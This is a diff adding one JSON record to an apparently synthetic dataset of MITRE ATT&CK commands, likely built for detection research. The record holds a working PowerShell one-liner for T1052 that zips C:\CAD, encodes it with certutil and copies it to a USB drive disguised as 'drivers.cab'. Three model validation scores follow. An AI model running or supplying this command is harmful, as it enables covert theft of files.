@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=Join-Path $env:TEMP 'cad.zip'; Compress-Archive -Path 'C:\\CAD' -DestinationPath $zip -Force; certutil -f -encode $zip (Join-Path $usb 'drivers.cab') > $null",
+  "explanation": "Creates a zip of a target directory and writes a base64-encoded version to the removable drive using certutil.",
+  "rationale_steps": [
+    "Find removable drive",
+    "Archive target data",
+    "Encode with certutil for content-masking",
+    "Write encoded output to USB"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-5a8e4c43",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Uses valid PowerShell syntax with balanced quotes/parentheses, correct cmdlet parameters, and proper statement separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It locates a removable drive, compresses C:\\CAD, base64-encodes the archive, and writes a disguised file to the USB (T1052), though it may fail if no removable drive with a letter exists.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T10:14:05.786080Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed PowerShell with balanced parentheses and quotes, valid semicolon separators, correct cmdlet syntax for Get-Volume, Compress-Archive, and certutil, and proper path construction using Join-Path and string concatenation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable drive, staging target data (C:\\CAD) into a compressed archive in TEMP, then using certutil to base64-encode and write it to the USB drive with a deceptive filename ('drivers.cab'), fully aligning with the technique's staging, obfuscation, and physical medium transfer behaviors.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:41:31.267710Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command uses correct syntax, proper variable assignments, valid cmdlets, and correctly balanced parentheses and quotes.",
+        "semantic_score": 5,
+        "semantic_justification": "The command logically identifies a removable drive, stages data via compression, and uses certutil for obfuscation and exfiltration, perfectly matching the T1052 technique description.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:41:32.905809Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
